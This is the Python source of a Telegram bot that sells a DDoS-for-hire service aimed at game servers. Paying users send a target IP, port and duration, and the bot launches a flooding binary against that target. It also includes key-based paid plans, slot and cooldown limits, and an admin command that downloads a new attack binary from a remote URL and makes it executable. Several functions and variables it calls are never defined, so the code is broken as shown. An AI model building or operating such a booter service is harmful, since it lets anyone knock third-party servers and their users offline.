import telebot
import subprocess
import datetime
import os
import random
import string
import time
import threading
import json
import re
import sys
import requests

# ========================================================
# 🔒 [DRX SECURITY & INTEGRITY SYSTEM]
# ========================================================
REAL_OWNER = "@DRX_POWER"
REMOTE_UPDATE_URL = "https://raw.githubusercontent.com/your-repo/master/bgmi" # अपना लिंक यहाँ बदलें

def check_security():
    with open(__file__, 'r') as f:
        content = f.read()
        if REAL_OWNER not in content:
            return False
    return True

def security_error_msg(chat_id):
    error_text = f"❌ <b>𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘 𝐀𝐋𝐄𝐑𝐓</b> ❌\n━━━━━━━━━━━━━━━━━━━━━\n⚠️ <b>ERROR:</b> OWNER NAME MODIFIED!\n👤 <b>REAL OWNER:</b> {REAL_OWNER}\n━━━━━━━━━━━━━━━━━━━━━\nबोट की कोडिंग के साथ छेड़छाड़ की गई है।"
    bot.send_message(chat_id, error_text, parse_mode="HTML")

# बोट शुरू होते ही सुरक्षा की जांच करेगा
if not check_security():
    print(f"❌ TAMPERING DETECTED! REAL OWNER IS {REAL_OWNER}")
    sys.exit(1)
    
# --- [DEVELOPER FILE LOCK SYSTEM] ---
def verify_developer_file():
    dev_file = "developer.txt"
    
    # 1. चेक करना कि क्या फाइल मौजूद है
    if not os.path.exists(dev_file):
        print("❌ CRITICAL ERROR: developer.txt is missing!")
        sys.exit(1) # बोट क्रैश हो जाएगा

    # 2. चेक करना कि क्या फाइल में आपका नाम है
    with open(dev_file, 'r') as f:
        content = f.read()
        if "@DRX_POWER" not in content or "Dipanshu" not in content:
            print("❌ TAMPERING DETECTED in developer.txt!")
            sys.exit(1) # नाम बदलने पर क्रैश

# बोट शुरू होने से पहले इसे चलाएं
verify_developer_file()

# --- CONFIGURATION LOAD ---
with open('config.json') as f:
    config = json.load(f)

bot = telebot.TeleBot(config['bot_token'])
admin_id = [str(config['admin_id'])]

# Global States
active_attacks = {} 
user_cooldowns = {}
user_approval_expiry = {}
COOLDOWN_TIME = 80 # 80 Seconds ka break
MAX_SLOTS = 10 # Maximum 10 users hi attack kar sakte hain
MAINTENANCE_MODE = False  # By default off rahega

# --- [AUTOMATIC FILE INITIALIZATION] ---
FILES = {
    "users.txt": "",
    "key.txt": "",
    "redeem.txt": "--- REDEEMED KEYS LOG ---\n",
    "userdetailskey.txt": "--- USER ACCESS DETAILS ---\n"
}

for filename, initial_content in FILES.items():
    if not os.path.exists(filename):
        with open(filename, "w") as f:
            f.write(initial_content)
        print(f"✅ Created missing file: {filename}")

# --- [REDEEM LOGIC UPDATE] ---
def log_redeem_details(user_id, key):
    # इस्तेमाल हुई की को अलग फाइल में सेव करना
    with open("redeem.txt", "a") as f:
        f.write(f"Key: {key} | Used by: {user_id} | Date: {datetime.datetime.now()}\n")
    
    # यूजर और उसकी की का मैप बनाना
    with open("userdetailskey.txt", "a") as f:
        f.write(f"UserID: {user_id} <-> ActiveKey: {key}\n")
        
# --- HELPER FUNCTIONS ---
def run_attack_process(chat_id, target, port, duration, threads):
    try:
        # बाइनरी को कमांड भेजना
        full_command = f"./bgmi {target} {port} {duration} {threads}"
        
        # .wait() का इस्तेमाल करने से पाइथन तब तक रुकेगा जब तक बाइनरी खत्म न हो जाए
        process = subprocess.Popen(full_command, shell=True)
        
        # यह लाइन बाइनरी के खत्म होने का इंतज़ार करेगी
        process.wait() 

        # जब बाइनरी अपना काम (Attack) पूरा कर लेगी, तभी नीचे वाला कोड चलेगा
        user_cooldowns[str(chat_id)] = time.time()
        
        finished_text = (
            f"✅ <b>𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📍 <b>𝐓𝐚𝐫𝐠𝐞𝐭:</b> <code>{target}</code>\n"
            f"🔌 <b>𝐏𝐨𝐫𝐭:</b> <code>{port}</code>\n"
            f"⏳ <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> Binary Process Completed\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🚀 <b>𝐎𝐰𝐧𝐞𝐫:</b> {REAL_OWNER}"
        )
        bot.send_message(chat_id, finished_text, parse_mode="HTML")

    except Exception as e:
        bot.send_message(chat_id, f"❌ <b>Error:</b> Attack interrupted or binary failed.")
    finally:
        if chat_id in active_attacks:
            del active_attacks[chat_id]

# --- USER COMMANDS (ALL ADDED) ---
@bot.message_handler(commands=['start'])
def welcome_start(message):
    if not check_security(): security_error_msg(message.chat.id); return
    
    # developer.txt से जानकारी पढ़ना
    with open("developer.txt", "r") as f:
        dev_info = f.read()

    welcome_text = (
        f"🛡️ <b>𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 𝐃𝐄𝐓𝐀𝐈𝐋𝐒:</b>\n"
        f"<code>{dev_info}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐃𝐑𝐗 𝐄𝐝𝐢𝐭𝐢𝐨𝐧 {message.from_user.first_name}!\n\n"
        f"🎯 /bgmi : Start Attack\n"
        f"📊 /status : Live Status\n"
        f"📦 /myinfo : User Info\n"
        f"💎 /plan : Check Plans\n"
        f"⚙️ /redeem : Activate Key\n"
        f"❓ /help : All Commands\n\n"
        f"🚀 <b>𝐎𝐰𝐧𝐞𝐫:</b> {REAL_OWNER}"
    )
    bot.reply_to(message, welcome_text, parse_mode="HTML")

@bot.message_handler(commands=['help'])
def show_help(message):
    if not check_security(): security_error_msg(message.chat.id); return
    help_text = f"🌟 <b>𝐃𝐑𝐗 𝐇𝐄𝐋𝐏 𝐌𝐄𝐍𝐔</b> 🌟\n━━━━━━━━━━━━━━━━━━━━━━\n"
    help_text += "/bgmi - Attack\n/status - Live\n/plan - Price\n/redeem - Key\n/myinfo - Stats\n"
    if str(message.chat.id) in admin_id:
        help_text += "\n👑 <b>ADMIN:</b>\n/genkey, /broadcast, /maintenance, /update, /add, /remove"
    help_text += f"\n━━━━━━━━━━━━━━━━━━━━━━\n🚀 <b>𝐎𝐰𝐧𝐞𝐫:</b> {REAL_OWNER}"
    bot.send_message(message.chat.id, help_text, parse_mode="HTML")

# --- /myinfo Command Logic (Redeem Only) ---
@bot.message_handler(commands=['myinfo'])
def show_my_info(message):
    user_id = str(message.from_user.id)
    username = message.from_user.first_name
    
    # Starting message
    sent_msg = bot.reply_to(message, "⏳ <b>𝐅𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐋𝐢𝐯𝐞 𝐃𝐚𝐭𝐚...</b>", parse_mode="HTML")

    def live_timer():
        # 12 baar update karega (5 sec gap = 1 minute total live dikhayega)
        # Aap range ko badha sakte ho agar lamba countdown chahiye
        for _ in range(12): 
            current_time = datetime.datetime.now()
            
            if user_id in user_approval_expiry and user_id in allowed_user_ids:
                expiry_date = user_approval_expiry[user_id]
                remaining_time = expiry_date - current_time
                
                if remaining_time.total_seconds() > 0:
                    status = "✅ 𝐀𝐜𝐭𝐢𝐯𝐞"
                    plan_type = "💎 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐕𝐈𝐏"
                    expiry = str(remaining_time).split('.')[0] 
                else:
                    status = "🚫 𝐄𝐱𝐩𝐢𝐫𝐞𝐝"
                    plan_type = "𝐍𝐨𝐧𝐞"
                    expiry = "𝐏𝐥𝐚𝐧 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝 ❌"
            else:
                status = "🚫 𝐈𝐧𝐚𝐜𝐭𝐢𝐯𝐞"
                plan_type = "𝐍𝐨𝐧𝐞"
                expiry = "𝐍/𝐀 - 𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐚 𝐩𝐥𝐚𝐧"

            response = (
                f"👤 <b>𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>𝐍𝐚𝐦𝐞:</b> {username}\n"
                f"🆔 <b>𝐔𝐬𝐞𝐫 𝐈𝐃:</b> <code>{user_id}</code>\n"
                f"📦 <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> {status}\n"
                f"💎 <b>𝐏𝐥𝐚𝐧 𝐓𝐲𝐩𝐞:</b> {plan_type}\n"
                f"⏳ <b>𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐓𝐢𝐦𝐞:</b> {expiry}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🚀 <b>𝐏𝐨𝐰𝐞𝐫:</b> 𝐃𝐑𝐗 𝐃𝐃𝐎𝐒 𝐏𝐎𝐖𝐄𝐑 🔥"
            )

            try:
                # Har 5 second mein message update hoga
                bot.edit_message_text(response, chat_id=message.chat.id, message_id=sent_msg.message_id, parse_mode="HTML")
            except Exception:
                # Agar user ne chat delete ki ya same text edit karne ki koshish ki toh error handle hoga
                break
            
            time.sleep(5) # 5 seconds ka interval

    # Background thread taaki bot hang na ho
    threading.Thread(target=live_timer).start()

@bot.message_handler(commands=['plan'])
def show_plan_list(message):
    user_id = str(message.chat.id)
    
    # Premium Plan List Design
    plan_message = (
        "💎 <b>𝐋𝐀𝐗𝐗𝐘 𝐕𝐈𝐏 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐏𝐋𝐀𝐍𝐒</b> 💎\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🟠 <b>𝐃𝐀𝐈𝐋𝐘 𝐏𝐋𝐀𝐍</b>\n"
        "🕒 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: 24 Hours\n"
        "💰 𝐏𝐫𝐢𝐜𝐞: ₹99\n"
        "🚀 𝐏𝐨𝐰𝐞𝐫: Full Access (240s)\n\n"
        "🟢 <b>𝐖𝐄𝐄𝐊𝐋𝐘 𝐏𝐋𝐀𝐍</b>\n"
        "🕒 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: 7 Days\n"
        "💰 𝐏𝐫𝐢𝐜𝐞: ₹499\n"
        "🚀 𝐏𝐨𝐰𝐞𝐫: High Priority\n\n"
        "🔵 <b>𝐌𝐎𝐍𝐓𝐇𝐋𝐘 𝐏𝐋𝐀𝐍</b>\n"
        "🕒 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: 30 Days\n"
        "💰 𝐏𝐫𝐢𝐜𝐞: ₹1499\n"
        "🚀 𝐏𝐨𝐰𝐞𝐫: VIP Slots + Support\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "💳 <b>𝐅𝐨𝐫 𝐏𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐂𝐨𝐧𝐭𝐚𝐜𝐭:</b> @DRX_POWER\n"
        "📢 <b>𝐍𝐨𝐭𝐞:</b> Keys are non-refundable."
    )
    
    # User status check
    if user_id in allowed_user_ids:
        plan_message += "\n\n✅ <b>𝐘𝐨𝐮𝐫 𝐒𝐭𝐚𝐭𝐮𝐬:</b> Premium User"
    else:
        plan_message += "\n\n❌ <b>𝐘𝐨𝐮𝐫 𝐒𝐭𝐚𝐭𝐮𝐬:</b> No Active Plan"
        
    bot.reply_to(message, plan_message, parse_mode="HTML")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    # --- [STEP 1] MAINTENANCE CHECK ---
    if MAINTENANCE_MODE and user_id not in admin_id:
        bot.reply_to(message, "🛠️ <b>𝐁𝐎𝐓 𝐔𝐍𝐃𝐄𝐑 𝐌𝐀𝐈𝐍𝐓𝐄𝐍𝐀𝐍𝐂𝐄</b>\n\nAbhi maintenance chal raha hai. Please kuch der baad try karein. 🚀", parse_mode="HTML")
        return
        
    # --- [STEP 2] PLAN CHECK ---
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "🚫 <b>𝐓𝐮𝐦𝐚𝐫𝐚 𝐤𝐨𝐢 𝐛𝐡𝐢 𝐩𝐥𝐚𝐧 𝐚𝐜𝐭𝐢𝐯𝐞 𝐧𝐚𝐡𝐢 𝐂𝐨𝐧𝐭𝐚𝐜𝐭 @DRX_POWER</b>", parse_mode="HTML")
        return
        
    # --- [STEP 3] SLOT CHECK ---
    current_active_attacks = len(active_attacks)
    if current_active_attacks >= MAX_SLOTS:
        bot.reply_to(message, (
            f"⚠️ <b>𝐒𝐋𝐎𝐓𝐒 𝐀𝐑𝐄 𝐅𝐔𝐋𝐋</b>\n\n"
            f"📊 <b>Active Attacks:</b> {current_active_attacks}/{MAX_SLOTS}\n"
            f"⏳ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 𝐤𝐮𝐜𝐡 𝐚𝐭𝐭𝐚𝐜𝐤𝐬 𝐤𝐡𝐚𝐭𝐚𝐦 𝐡𝐨𝐧𝐞 𝐝𝐨."
        ), parse_mode="HTML")
        return
        
    # --- [STEP 4] COOLDOWN CHECK ---
    current_time = time.time()
    if user_id in user_cooldowns:
        elapsed_time = current_time - user_cooldowns[user_id]
        if elapsed_time < COOLDOWN_TIME:
            remaining_cooldown = int(COOLDOWN_TIME - elapsed_time)
            bot.reply_to(message, f"⏳ <b>𝐂𝐎𝐎𝐋𝐃𝐎𝐖𝐍 𝐀𝐂𝐓𝐈𝐕𝐄</b>\n\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭 <code>{remaining_cooldown}s</code> 𝐛𝐞𝐟𝐨𝐫𝐞 𝐧𝐞𝐱𝐭 𝐚𝐭𝐭𝐚𝐜𝐤.🚀", parse_mode="HTML")
            return

    command = message.text.split()
    
    # --- [NEW] USAGE MESSAGE CHECK ---
    if len(command) != 4:
        usage_message = (
            "✅ <b>𝐔𝐬𝐚𝐠𝐞 :-</b> <code>/bgmi <target> <port> <time></code>"
        )
        bot.reply_to(message, usage_message, parse_mode="HTML")
        return

    target, port, time_duration = command[1], command[2], int(command[3])
    
    # --- [NEW] IP & PORT LOCK (Same target check) ---
    for atk in active_attacks.values():
        if atk['ip'] == target and atk['port'] == port:
            bot.reply_to(message, f"❌ <b>𝐓𝐚𝐫𝐠𝐞𝐭 𝐋𝐨𝐜𝐤𝐞𝐝!</b>\nYeh target (<code>{target}:{port}</code>) pehle se attack ho raha hai.", parse_mode="HTML")
            return
        
    # --- 🛡️ IP & PORT VALIDATION ---
    import re
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    
    if not ip_pattern.match(target):
        bot.reply_to(message, "❌ <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐈𝐏 𝐀𝐝𝐝𝐫𝐞𝐬𝐬!</b>", parse_mode="HTML")
        return
        
    try:
        port_int = int(port)
        if not (1 <= port_int <= 65535):
            bot.reply_to(message, "❌ <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐏𝐨𝐫𝐭! (1-65535)</b>", parse_mode="HTML")
            return
    except ValueError:
        bot.reply_to(message, "❌ <b>𝐏𝐨𝐫𝐭 𝐧𝐮𝐦𝐛𝐞𝐫 𝐡𝐨𝐧𝐚 𝐜𝐡𝐚𝐡𝐢𝐲𝐞.</b>", parse_mode="HTML")
        return

    if time_duration > 240:
        bot.reply_to(message, "❌ <b>𝐄𝐫𝐫𝐨𝐫: 𝐌𝐚𝐱 𝟐𝟒𝟎𝐬.</b>", parse_mode="HTML")
        return

    # Attack Start Logic
    active_attacks[message.chat.id] = {"ip": target, "port": port, "end_time": current_time + time_duration}
    
    slots_used = len(active_attacks)
    slots_left = MAX_SLOTS - slots_used

    bot.reply_to(message, (
        f"🚀 <b>𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📍 <b>𝐓𝐚𝐫𝐠𝐞𝐭:</b> <code>{target}</code>\n"
        f"🔌 <b>𝐏𝐨𝐫𝐭:</b> <code>{port}</code>\n"
        f"⏳ <b>𝐓𝐢𝐦𝐞:</b> <code>{time_duration}s</code>\n"
        f"📊 <b>𝐒𝐥𝐨𝐭𝐬:</b> {slots_used}/{MAX_SLOTS} (Left: {slots_left})\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🚀 <b>𝐏𝐨𝐰𝐞𝐫:</b> 𝐃𝐑𝐗 𝐃𝐃𝐎𝐒 𝐏𝐎𝐖𝐄𝐑 🔥"
    ), parse_mode="HTML")

    # Background thread for execution and finished message
    threading.Thread(target=run_attack, args=(message.chat.id, target, port, time_duration)).start()
# --- ADMIN & REDEEM COMMANDS ---

@bot.message_handler(commands=['genkey'])
def handle_genkey(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        
        # --- [NEW] USAGE CHECK ---
        if len(command) != 5:
            usage_text = (
                "✅ <b>Usage:</b> <code>/genkey <random/name> <time> <price> <ddos_time></code>"
            )
            bot.reply_to(message, usage_text, parse_mode="HTML")
            return

        key_type = command[1]
        time_val = command[2]
        price_val = command[3]
        ddos_val = command[4]

        # Custom key or random logic
        generated_key = generate_key_str() if key_type.lower() == "random" else key_type
        save_key(generated_key, time_val, price_val, ddos_val)

        # Premium Response Design
        response = (
            f"✨ <b>𝐆𝐄𝐍𝐄𝐑𝐀𝐓𝐎𝐑 𝐊𝐄𝐘 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋</b> ✅\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 <b>𝐊𝐞𝐲:</b> <code>{generated_key}</code>\n"
            f"⏳ <b>𝐕𝐚𝐥𝐢𝐝𝐢𝐭𝐲:</b> {time_val}\n"
            f"🏷️ <b>𝐏𝐫𝐢𝐜𝐞:</b> {price_val}\n"
            f"🚀 <b>𝐃𝐃𝐨𝐬 𝐓𝐢𝐦𝐞:</b> {ddos_val}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📢 <b>𝐍𝐨𝐭𝐢𝐜𝐞:</b> Tap the key to copy it!"
        )
        bot.reply_to(message, response, parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ <b>𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝!</b> Only Admin can generate keys.", parse_mode="HTML")

@bot.message_handler(commands=['redeem'])
def handle_redeem(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ Usage: /redeem <key>")
        return

    input_key = command[1]
    found, new_keys, key_details = False, [], {}

    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "r") as f:
            for line in f:
                if line.strip():
                    k, t, p, d = line.strip().split('|')
                    if k == input_key:
                        found, key_details = True, {"time": t, "price": p, "ddos": d}
                    else: new_keys.append(line)

    if found:
        with open(KEY_FILE, "w") as f: f.writelines(new_keys)
        if user_id not in allowed_user_ids:
            allowed_user_ids.append(user_id)
            with open(USER_FILE, "a") as f: f.write(f"{user_id}\n")
        
        # --- FIXED TIME STACKING LOGIC ---
        try:
            import re
            duration = int(re.search(r'\d+', key_details['time']).group())
            unit = re.search(r'[a-zA-Z]+', key_details['time']).group().lower()
            current_time = datetime.datetime.now()
            
            base_time = user_approval_expiry[user_id] if (user_id in user_approval_expiry and user_approval_expiry[user_id] > current_time) else current_time
            
            if 'hour' in unit: expiry = base_time + datetime.timedelta(hours=duration)
            elif 'day' in unit: expiry = base_time + datetime.timedelta(days=duration)
            elif 'week' in unit: expiry = base_time + datetime.timedelta(weeks=duration)
            elif 'month' in unit: expiry = base_time + datetime.timedelta(days=30 * duration)
            
            user_approval_expiry[user_id] = expiry
        except: pass

        bot.reply_to(message, f"✅ Redeem Successful! Plan Added.")
    else:
        bot.reply_to(message, "❌ Invalid or Used Key.")

# --- PREMIUM BROADCAST COMMAND ---
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    
    # Sirf Admin hi use kar sake
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        
        if len(command) > 1:
            text_to_broadcast = command[1]
            success_count = 0
            
            # Formatting the broadcast message
            formatted_msg = (
                "📢 <b>𝐀𝐃𝐌𝐈𝐍 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐍𝐎𝐓𝐈𝐂𝐄</b> 📢\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📝 {text_to_broadcast}\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                "🚀 <b>𝐏𝐨𝐰𝐞𝐫:</b> <b>𝐃𝐑𝐗 𝐃𝐃𝐎𝐒 𝐏𝐎𝐖𝐄𝐑 🔥</b>"
            )

            # Sabhi users ko bhejna
            for uid in allowed_user_ids:
                try:
                    bot.send_message(uid, formatted_msg, parse_mode="HTML")
                    success_count += 1
                except:
                    pass # Agar user ne bot block kiya ho
            
            bot.reply_to(message, f"✅ <b>𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 𝐒𝐞𝐧𝐭!</b>\n📊 <b>𝐑𝐞𝐜𝐢𝐩𝐢𝐞𝐧𝐭𝐬:</b> {success_count} Users")
        else:
            bot.reply_to(message, "⚠️ <b>𝐔𝐬𝐚𝐠𝐞:</b> /broadcast &lt;your message&gt;", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ <b>𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝!</b> Sirf Admin notice bhej sakta hai.")

@bot.message_handler(commands=['update'])
def update_files(message):
    if str(message.chat.id) in admin_id: # केवल तुम (Admin) ही कर सकते हो
        bot.reply_to(message, "⏳ <b>𝐅𝐞𝐭𝐜𝐡𝐢𝐧𝐠 𝐧𝐞𝐰 𝐛𝐢𝐧𝐚𝐫𝐲 𝐟𝐢𝐥𝐞 𝐟𝐫𝐨𝐦 𝐃𝐑𝐗 𝐆𝐚𝐭𝐞𝐰𝐚𝐲...</b>", parse_mode="HTML")
        try:
            # यह तुम्हारे दिए हुए लिंक से फाइल उठाएगा
            r = requests.get(REMOTE_UPDATE_URL) 
            with open("bgmi", "wb") as f:
                f.write(r.content) # फाइल को 'bgmi' नाम से सेव करेगा
            
            # फाइल को चलने की ताकत (Permission) देना
            os.chmod("bgmi", 0o777) 
            
            bot.reply_to(message, "✅ <b>𝐃𝐑𝐗 𝐁𝐢𝐧𝐚𝐫𝐲 𝐔𝐩𝐝𝐚𝐭𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲!</b>\nबोट अब नई फाइल का इस्तेमाल करेगा।", parse_mode="HTML")
        except Exception as e:
            bot.reply_to(message, f"❌ <b>𝐔𝐩𝐝𝐚𝐭𝐞 𝐅𝐚𝐢𝐥𝐞𝐝:</b> {e}")

print(f"DRX Master Bot Active... Owner: {REAL_OWNER}")
bot.infinity_polling()
